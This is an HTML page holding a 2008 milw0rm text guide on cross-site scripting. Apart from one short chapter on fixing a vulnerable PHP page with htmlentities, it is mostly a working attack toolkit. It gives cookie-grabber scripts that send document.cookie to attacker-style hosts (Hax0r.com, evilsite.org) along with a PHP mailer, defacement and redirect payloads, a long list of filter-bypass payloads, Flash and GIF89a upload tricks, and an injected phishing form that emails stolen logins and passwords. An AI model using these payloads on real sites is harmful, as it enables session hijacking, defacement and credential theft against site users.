@@ -1,0 +1,596 @@
+<html>
+<head>
+<title>Cross Site Scripting - Attack and Defense guide</title>
+<pre>
+﻿                                                                           ____
+                                                                             /   /
+ ________________________________________________________________________/   /
+|                                                                       /   /
+|           Cross Site Scripting - Attack and Defense guide            /   /
+|_____________________________________________________________________/   /
+                                                                     /   /
+                                             By Xylitol 10-02-08    /___/
+
+
+	Author: Xylitol
+
+	Description: a simple guide on XSS methods.
+
+	Homepage: http://xylitol.free.fr
+
+	Contact: Xylitol[at]fbi[dot]gov
+
+	Date: 10/02/08
+
+
+	Summary:
+		1&gt;  What is XSS ?
+		2&gt;  Code a XSS vulnerability
+		3&gt;  Make a cookie grabber
+		4&gt;  Securing XSS
+		5&gt;  Deface Methods
+		6&gt;  Filteration Bypassing
+		7&gt;  Flash attak
+		8&gt;  XSS upload
+		9&gt;  phishing XSS
+
+
+         ____                                   ____
+        /   /                                   \   \
+ ______/   /_____________________________________\   \______
+|     /   /                                       \   \     |
+|    /   /.:      Chapter 1 - What is XSS ?      :.\   \    |
+|___/   /___________________________________________\   \___|
+   /   /   (From Wikipedia, the free encyclopedia)   \   \
+  /___/                                               \___\
+
+
+
+Cross-zone scripting is a browser exploit taking
+advantage of a vulnerability within a zone-based security solution.
+The attack allows content (scripts) in unprivileged zones
+to be executed with the permissions of a privileged zone - i.e.
+a privilege escalation within the client (web browser) executing the script.
+The vulnerability could be:
+
+    * a web browser bug which under some conditions allows content (scripts)
+in one zone to be executed with the permissions of a higher privileged zone.
+
+    * a web browser configuration error; unsafe sites listed in privileged zones.
+
+    * a cross-site scripting vulnerability within a privileged zone
+
+A common attack scenario involves two steps.
+The first step is to use a Cross Zone Scripting vulnerability
+to get scripts executed within a privileged zone. To complete the attack,
+then perform malicious actions on the computer using insecure ActiveX components.
+
+This type of vulnerability has been exploited to silently install
+various malware (such as spyware, remote control software, worms and such)
+onto computers browsing a malicious web page.
+
+                                        
+
+
+         ____                                   ____
+        /   /                                   \   \
+ ______/   /_____________________________________\   \______
+|     /   /                                       \   \     |
+|    /   /.:Chapter 2 - Code a XSS vulnerability :.\   \    |
+|___/   /___________________________________________\   \___|
+   /   /                                             \   \
+  /___/                                               \___\
+
+
+
+Open notepad and copy/past this script:
+
+
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot; /&gt;
+
+&lt;style type=&quot;text/css&quot;&gt;
+&lt;!--
+body,td,th {
+	color: #FFFFFF;
+}
+body {
+	background-color: #000000;
+}
+--&gt;
+&lt;/style&gt;&lt;title&gt;Simple XSS vulnerability by Xylitol&lt;/title&gt;
+&lt;body&gt;
+&lt;form action=&quot;XSS.php&quot; method=&quot;post&quot;&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;strong&gt;Simple XSS vulnerability by Xylitol &lt;/strong&gt;&lt;/p&gt;
+&lt;div align=&quot;center&quot;&gt;
+  &lt;table width=&quot;270&quot; border=&quot;0&quot;&gt;
+    &lt;tr&gt;
+      &lt;td width=&quot;106&quot;&gt;&lt;strong&gt;Search:&lt;/strong&gt;&lt;/td&gt;
+        &lt;td width=&quot;154&quot;&gt;&lt;input name=&quot;Vulnerability&quot; type=&quot;text&quot; id=&quot;Vulnerability&quot; /&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/table&gt;
+  &lt;table width=&quot;268&quot; border=&quot;0&quot;&gt;
+    &lt;tr&gt;
+      &lt;td width=&quot;262&quot;&gt;&lt;div align=&quot;center&quot;&gt;
+        &lt;input name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;     Search it !     &quot; /&gt;
+      &lt;/div&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/table&gt;
+  &lt;/div&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+
+
+
+after, save this page: index.html
+open a new notpad and Copy/past that:
+
+
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot; /&gt;
+&lt;title&gt;Search result:&lt;/title&gt;
+&lt;style type=&quot;text/css&quot;&gt;
+&lt;!--
+body,td,th {
+	color: #FFFFFF;
+}
+body {
+	background-color: #000000;
+}
+--&gt;
+&lt;/style&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;span class=&quot;alerte&quot;&gt;Search result  :&lt;/span&gt;&amp;nbsp;&lt;strong&gt;&lt;?php echo $_POST['Vulnerability']; ?&gt;&lt;/strong&gt;&amp;nbsp;
+&lt;/body&gt;
+&lt;/html&gt;
+
+save this page in: XSS.php
+close notepad
+
+open index.html in firefox
+enter a value and search
+return on the page of research and enter  &lt;script&gt;alert('XSS')&lt;/script&gt;
+send the form
+bingo a dialogue box !
+
+ _______________________________________
+/  http://127.0.0.1 dit:              X \
+|________________________________________|
+|                                        |
+|                                        |
+|    ^                                   |
+|   / \                                  |
+|  / | \      XSS                        |
+| /  .  \                                |
+| -------                                |
+|                       ______           |
+|                      |  OK  |          |
+|                       ------           |
+|________________________________________|
+            XSS Vulnerability is here...
+
+
+
+
+
+         ____                                  ____
+        /   /                                  \   \
+ ______/   /____________________________________\   \______
+|     /   /                                      \   \     |
+|    /   /.: Chapter 3 - Make a cookie grabbers :.\   \    |
+|___/   /__________________________________________\   \___|
+   /   /                                            \   \
+  /___/                                              \___\
+
+
+
+insert this script in a vulnerable page (for exemple a guestbook)
+
+&lt;script&gt;
+window.open(&quot;http://www.Hax0r.com/cookie.php?cookies=&quot;+document.cookie);
+&lt;/script&gt;
+
+
+(www.Hax0r.com = your site)
+Open notepad and make a page: cookie.php
+copy/past this code:
+
+
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot; /&gt;
+&lt;title&gt;Error&lt;/title&gt;
+&lt;style type=&quot;text/css&quot;&gt;
+&lt;!--
+body,td,th {
+	color: #FFFFFF;
+}
+body {
+	background-color: #000000;
+}
+--&gt;
+&lt;/style&gt;&lt;/head&gt;
+&lt;? mail('email@example.com', 'Cookie stealed ! - thx xyli :)', $cookies); ?&gt; 
+&lt;body&gt;
+&lt;h2&gt;&lt;strong&gt;Error&lt;/strong&gt; - &lt;strong&gt;Access denied&lt;/strong&gt; for &lt;? echo $_SERVER[&quot;REMOTE_ADDR&quot;]; ?&gt;&lt;/h2&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+
+It is not enough any more but for the pirate,
+than to await the reception of the email and to read the cookie there.
+
+
+
+         ____                                 ____
+        /   /                                 \   \
+ ______/   /___________________________________\   \______
+|     /   /                                     \   \     |
+|    /   /.:      Chapter 4 - Securing XSS     :.\   \    |
+|___/   /_________________________________________\   \___|
+   /   /                                           \   \
+  /___/                                             \___\
+
+
+FIX it:
+for fix XSS Vulnerability use htmlentities:
+
+
+in line 16 Remplace:
+&lt;body&gt;
+&lt;span class=&quot;alerte&quot;&gt;Search result  :&lt;/span&gt;&amp;nbsp;&lt;strong&gt;&lt;?php echo $_POST['Vulnerability']; ?&gt;&lt;/strong&gt;&amp;nbsp;
+&lt;/body&gt;
+
+By:
+
+&lt;body&gt;
+&lt;span class=&quot;alerte&quot;&gt;Search result  :&lt;/span&gt;&amp;nbsp;&lt;strong&gt;&lt;?php
+if(isset($_POST['Vulnerability'])) { echo htmlentities($_POST['Vulnerability']); } ?&gt;&lt;/strong&gt;&amp;nbsp;
+&lt;/body&gt;
+
+
+use htmlspecialchars() function in PHP ;)
+
+other function:
+htmlentities() quotes
+strip_tags()
+...
+
+         ____                                 ____
+        /   /                                 \   \
+ ______/   /___________________________________\   \______
+|     /   /                                     \   \     |
+|    /   /.:     Chapter 5 -deface Methods     :.\   \    |
+|___/   /_________________________________________\   \___|
+   /   /                                           \   \
+  /___/                                             \___\
+
+
+defacer with a XSS and a rather simple thing
+here are the principal ones…
+
+defacement by an image:
+&lt;IMG SRC=&quot;http://hax0r.com/Haxored.png&quot;&gt;
+
+or a video flash:
+&lt;EMBED SRC=&quot;http://hax0r.com/Haxored.swf&quot;
+
+
+more knew: the redirection:
+&lt;script&gt;window.open( &quot;http://www.hax0r.com/Haxored.html&quot; )&lt;/script&gt;
+
+also see:
+&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=http://hax0r.com/Haxored.html&quot; /&gt;
+
+
+
+
+         ____                                 ____
+        /   /                                 \   \
+ ______/   /___________________________________\   \______
+|     /   /                                     \   \     |
+|    /   /.: Chapter 6 - Filteration Bypassing :.\   \    |
+|___/   /_________________________________________\   \___|
+   /   /                                           \   \
+  /___/                                             \___\
+
+
+actually it's not that easy to bypass htmlspecialchars()
+here some other example of xss Bypass:
+
+&lt;META HTTP-EQUIV=\&quot;refresh\&quot; CONTENT=\&quot;0;
+URL=http://;URL=javascript:alert('XSS');\&quot;&gt;
+
+&lt;META HTTP-EQUIV=\&quot;refresh\&quot;
+CONTENT=\&quot;0;url=javascript:alert('XSS');\&quot;&gt;
+
+'&quot;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt;
+
+'&quot;&gt;&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+'&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt;
+
+&quot;&gt;&lt;script alert(String.fromCharCode(88,83,83))&lt;/script&gt;
+
+&lt;iframe&lt;?php echo chr(11)?&gt; onload=alert('XSS')&gt;&lt;/iframe&gt;
+
+&lt;div
+style=&quot;x:expression((window.r==1)?'':eval('r=1;alert(String.fromCharCo
+de(88,83,83));'))&quot;&gt;
+
+window.alert(&quot;Xyli !&quot;);
+
+&quot;/&gt;&lt;/a&gt;&lt;/&gt;&lt;img src=1.gif onerror=alert(1)&gt;
+
+[color=red' onmouseover=&quot;alert('xss')&quot;]mouse over[/color]
+
+&lt;body onLoad=&quot;alert('XSS');&quot;
+
+&lt;body onunload=&quot;javascript:alert('XSS');&quot;&gt;
+
+[url=javascript:alert('XSS');]click me[/url]
+
+&lt;script language=&quot;JavaScript&quot;&gt;alert('XSS')&lt;/script&gt;
+
+&lt;img src=&quot;javascript:alert('XSS')&quot;&gt;
+
+'); alert('XSS
+
+&lt;font style='color:expression(alert(document.cookie))'&gt;
+
+&lt;IMG DYNSRC=\&quot;javascript:alert('XSS')\&quot;&gt;
+
+&lt;IMG LOWSRC=\&quot;javascript:alert('XSS')\&quot;&gt;
+
+&lt;/textarea&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;
+
+&lt;/title&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;
+
+&lt;script src=http://yoursite.com/your_files.js&gt;&lt;/script&gt;
+
+&quot;&gt;&lt;script&gt;alert(0)&lt;/script&gt;
+
+&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
+
+&lt;IMG SRC=\&quot;jav&amp;#x0D;ascript:alert('XSS');\&quot;&gt;
+
+&lt;IMG SRC=\&quot;jav&amp;#x0A;ascript:alert('XSS');\&quot;&gt;
+
+&lt;IMG SRC=\&quot;jav&amp;#x09;ascript:alert('XSS');\&quot;&gt;
+
+&lt;marquee&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/marquee&gt;
+
+&lt;? echo('&lt;scr)';
+echo('ipt&gt;alert(\&quot;XSS\&quot;)&lt;/script&gt;'); ?&gt;
+
+&lt;IMG SRC=\&quot;jav&amp;#x0A;ascript:alert('XSS');\&quot;&gt;
+
+&lt;IMG SRC=\&quot;jav&amp;#x09;ascript:alert('XSS');\&quot;&gt;
+
+&lt;marquee&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/marquee&gt;
+
+&lt;style&gt;@im\port'\ja\vasc\ript:alert(\&quot;XSS\&quot;)';&lt;/style&gt;
+
+&lt;img src=foo.png onerror=alert(/xssed/) /&gt;
+
+&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
+
+&lt;scr&lt;script&gt;ipt&gt;alert('XSS');&lt;/scr&lt;/script&gt;ipt&gt;
+
+&lt;script&gt;location.href=&quot;http://www.evilsite.org/cookiegrabber.php?cookie=&quot;+
+escape(document.cookie)&lt;/script&gt;
+
+&lt;script src=&quot;http://www.evilsite.org/cookiegrabber.php&quot;&gt;&lt;/script&gt;
+
+&lt;script&gt;alert('XSS');&lt;/script&gt;
+
+&lt;script&gt;alert(1);&lt;/script&gt;
+
+
+Here and there is of it full with others
+google is your friends
+         ____                                 ____
+        /   /                                 \   \
+ ______/   /___________________________________\   \______
+|     /   /                                     \   \     |
+|    /   /.:     Chapter 7 - Flash attack      :.\   \    |
+|___/   /_________________________________________\   \___|
+   /   /                                           \   \
+  /___/                                             \___\
+
+Flash is used for complex animations, simulations,
+*creation of games etc..
+What’s interesting for us is the getURL() action.
+This function allows us to redirect the end user to another page.
+its syntax is built as follows:
+getURL(url:String, [window: String,[method:String]])
+exemple:
+getURL(&quot;http://victime.com/login.php?logout=true&quot;,&quot;_self&quot;);
+
+
+url: indicate the URL of the site
+window: specify within which framework the request must take place (_self, _blank…)
+method: method of request GET or POST (by defect GET)
+
+
+here the handling of the actionscript and the Javascript to post a alert:
+getURL(&quot;javascript:alert('XSS'&quot;);
+
+
+
+in 2002 one will show the danger of this facility,
+one could for example post the cookie of visitors in this manner:
+getURL(&quot;javascript:alert(document.cookie)&quot;)
+
+in December 2005, a new alternative and appeared
+consisting has to benefit from a nonpermanent fault XSS
+and possibility of putting a file flash in its signature to give a permanent XSS,
+moreover the author of this alternative used this technique in order
+to infect MySpace with a deviated worms xss of Samy: Samy Reloaded
+
+cookie stealer in flash ?
+not but there is technique to do it
+exemple
+in a flash file:
+GetURL(&quot;http://www.victime.com/page.php?var=&lt;script src='http://www.hax0r.com/Haxored.js'&gt;&lt;/script&gt;&quot;,&quot;_self&quot;);
+
+and in Haxored.js:
+document.location=&quot;http://hax0r.com/cookiestealer.php?cookie=&quot;+document.cookie;
+
+
+For secure it simple solution: do not allow flash files in your web app
+
+
+         ____                                    ____
+        /   /                                    \   \
+ ______/   /______________________________________\   \______
+|     /   /                                        \   \     |
+|    /   /.:       Chapter 8 - XSS upload         :.\   \    |
+|___/   /____________________________________________\   \___|
+   /   /                                              \   \
+  /___/                                                \___\
+
+Make Haxored.gif in paint for exemple
+after open Haxored.GIF in notepad
+delete all line and insert this:
+GIF89a&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
+
+save and close it
+upload Haxored.gif in a free image hoster look your image
+and XSS is here...
+dont take Mozillia Firefox for look your image but Mozillia dont run your alert
+use Internet explorer
+
+Why add GIF89a ?
+well some upload like this one, check that the 'GIF89a' code
+is contained in the image as in any .GIF respective.
+the vulnerability of this upload results from the checking 'GIF89a' code
+for confirmation but of nothing the possible malicious codes contained in this image.
+GIF89a&lt;script src=&quot;http://hax0r.com/cookiegrabber.php&quot;&gt;&lt;/script&gt;
+
+to know the code for another image format,
+it is just enough to open an image jpg or other with a text editor,
+for example a png file: ‰PNG
+
+PNG = ‰PNG
+GIF = GIF89a
+JPG = ÿØÿà JFIF
+BMP = BMFÖ
+
+
+For secure it dont check getimagesize() only
+
+
+
+         ____                                    ____
+        /   /                                    \   \
+ ______/   /______________________________________\   \______
+|     /   /                                        \   \     |
+|    /   /.:       Chapter 9 - Phishing XSS       :.\   \    |
+|___/   /____________________________________________\   \___|
+   /   /                                              \   \
+  /___/                                                \___\
+
+you understood the goal of the phishing ?
+and XSS ?
+
+in our example it will be necessary to find a Vulnerable site to the XSS
+and to inject there oneself in a form to oneself directly in the URL the following code:
+
+
+&lt;p&gt;Enter your login and password, thank:&lt;/p&gt;
+&lt;form action=&quot;http://hax0r.com/mail.php&quot;&gt;
+&lt;table&gt;&lt;tr&gt;&lt;td&gt;Login:&lt;/td&gt;&lt;td&gt;&lt;input type=text length=20 name=login&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Password:&lt;/td&gt;&lt;td&gt;
+&lt;input type=text length=20 name=password&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;input type=submit value=          OK          &gt;
+&lt;/form&gt;
+
+
+
+
+you will have it to guess script will simulate a form of connextion and send the value to you
+example of file php for  sending this email (mail.php):
+
+
+
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot; /&gt;
+&lt;title&gt;Error&lt;/title&gt;
+&lt;style type=&quot;text/css&quot;&gt;
+&lt;!--
+body,td,th {
+	color: #FFFFFF;
+}
+body {
+	background-color: #000000;
+}
+--&gt;
+&lt;/style&gt;&lt;/head&gt;
+&lt;?php
+$login = $HTTP_GET_VARS[&quot;login&quot;];
+$password = $HTTP_GET_VARS[&quot;password&quot;];
+mail(&quot;email@example.com&quot;, &quot;Cookie stealed ! - thx xyli :)&quot;, $password , $login );
+?&gt; 
+&lt;body&gt;
+&lt;h2&gt;&lt;strong&gt;Error&lt;/strong&gt; -&lt;strong&gt; Server too much busy&lt;/strong&gt;&lt;/h2&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+
+
+
+the user will believe that the waiter and overloads some and will not suspect nothing
+I think that you understood this principle ?
+
+
+
+
+         ____                                    ____
+        /   /                                    \   \
+ ______/   /______________________________________\   \______
+|     /   /                                        \   \     |
+|    /   /.: Xylitol respects and hello's fly out :.\   \    |
+|___/   /____________________________________________\   \___|
+   /   /                                              \   \
+  /___/                                                \___\
+
+nexus, Langy, Uber0n, FullFreeez, RePliKaN!, bl00d, c0de91, Xonzai
+Agent-D, Agent-Z, Vamp, Xspider, Mitnick, Honnox, Blwood, str0ke
+
+and all hardworking sceners in the scene !
+
+ _________________________________
+|                                 |
+| .: Xylitol thanks this sites :. |
+|_________________________________|
+
+http://www.googlebig.com/
+http://xssed.com/
+http://www.xssing.com/
+http://www.milw0rm.com/
+http://H4cky0u.org/
+
+
+If you want to contact me for any stupid reason,
+drop me an MSN or WLM only: Xylitol[at]fbi[dot]gov
+____
+\   \ 
+ \   \_____________________________________________________________________________
+  \   \                                                                            |
+   \   \             Cross Site Scripting - Attack and Defense guide               |
+    \   \__________________________________________________________________________|
+     \   \ 
+      \___\  By Xylitol 10-02-08
+
+# milw0rm.com [2008-02-18]</pre>
+</html>
